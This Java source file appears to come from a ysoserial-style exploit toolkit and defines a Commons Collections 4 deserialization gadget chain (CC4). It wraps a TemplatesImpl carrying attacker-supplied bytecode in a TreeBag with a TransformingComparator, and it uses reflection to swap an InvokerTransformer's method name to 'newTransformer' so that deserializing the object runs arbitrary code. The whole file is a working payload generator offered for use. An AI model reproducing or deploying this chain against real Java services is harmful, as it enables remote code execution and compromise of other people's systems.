package com.mechoy.gadget;

import com.mechoy.bean.YsoGadgetBean;
import com.mechoy.gadget.inter.Gadget;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import com.mechoy.utils.TemplateUtils;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;

public class CC4 extends Gadget {

    @Override
    public Object getObject(YsoGadgetBean gadgetBean) throws Exception {
        TemplatesImpl template = null;
        template = super.generateTemplate(gadgetBean);
        Constructor<InvokerTransformer> declaredConstructor = InvokerTransformer.class.getDeclaredConstructor(String.class);
        declaredConstructor.setAccessible(true);
        InvokerTransformer newTransformer = declaredConstructor.newInstance("toString");

        TransformingComparator tc = new TransformingComparator(newTransformer);
        TreeBag tb = new TreeBag(tc);
        tb.add(template);

        Field iMethodName = newTransformer.getClass().getDeclaredField("iMethodName");
        iMethodName.setAccessible(true);
        iMethodName.set(newTransformer,"newTransformer");

        return tb;
    }
}
